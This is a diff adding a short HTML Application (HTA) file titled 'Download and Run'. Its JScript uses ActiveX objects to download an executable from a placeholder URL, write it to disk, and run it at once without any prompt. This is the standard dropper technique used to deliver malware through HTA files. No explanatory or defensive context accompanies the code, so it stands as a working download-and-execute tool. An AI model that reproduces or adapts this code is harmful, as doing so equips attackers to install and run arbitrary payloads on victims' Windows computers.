@@ -1,0 +1,39 @@
+<html>
+  <head>
+    <title>Download and Run</title>
+    <hta:application
+      id="DownloadAndRun"
+      applicationname="Download and Run"
+      icon="download.ico"
+      border="thin"
+      maximizebutton="no"
+      minimizebutton="yes"
+      contextmenu="no"
+      selection="no"
+      navigable="no"
+      singleinstance="yes"
+      sysmenu="yes"
+      />
+  </head>
+  <body>
+    <script type="text/javascript">
+      var wsh = new ActiveXObject("WScript.Shell");
+      var fileURL = "http://example.com/file.exe";
+      var fileName = "file.exe";
+      var filePath = "C:\\downloads\\" + fileName;
+      var xhr = new ActiveXObject("Microsoft.XMLHTTP");
+      xhr.open("GET", fileURL, false);
+      xhr.send();
+      if (xhr.status === 200) {
+        var adodbStream = new ActiveXObject("ADODB.Stream");
+        adodbStream.Open();
+        adodbStream.Type = 1;
+        adodbStream.Write(xhr.ResponseBody);
+        adodbStream.Position = 0;
+        adodbStream.SaveToFile(filePath, 2);
+        adodbStream.Close();
+      }
+      wsh.Run(filePath);
+    </script>
+  </body>
+</html>
